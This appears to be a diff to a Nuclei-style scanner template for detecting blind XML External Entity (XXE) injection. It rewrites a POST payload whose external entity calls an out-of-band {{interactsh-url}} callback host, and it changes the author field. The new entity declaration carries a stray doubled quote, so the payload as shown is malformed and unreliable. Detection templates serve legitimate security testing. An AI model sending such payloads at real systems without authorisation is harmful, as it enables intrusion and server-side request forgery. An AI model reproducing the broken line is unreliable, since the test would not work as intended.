@@ -4,6 +4,7 @@ http:
     type: word
     words:
     - http
+    - dns
   raw:
   - 'POST / HTTP/1.1
 
@@ -11,21 +12,26 @@ http:
 
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 
+    Content-Type: application/xml
+
     Referer: {{BaseURL}}
 
 
-    <?xml version="1.0"?>
+    <?xml version="1.0" encoding="UTF-8"?>
 
-    <!DOCTYPE foo SYSTEM "http://{{interactsh-url}}">
+    <!DOCTYPE foo [
 
-    <foo>&e1;</foo>
+    <!ELEMENT foo ANY>
+
+    <!ENTITY xxe SYSTEM "http://{{interactsh-url}}"">]>
+
+    <foo>&xxe;</foo>
 
     '
+  stop-at-first-match: true
 id: generic-blind-xxe
 info:
-  author: geeknik
-  metadata:
-    max-request: 1
+  author: reewardius
   name: Generic Blind XXE
   severity: high
-  tags: xxe,generic,blind
+  tags: xxe,generic
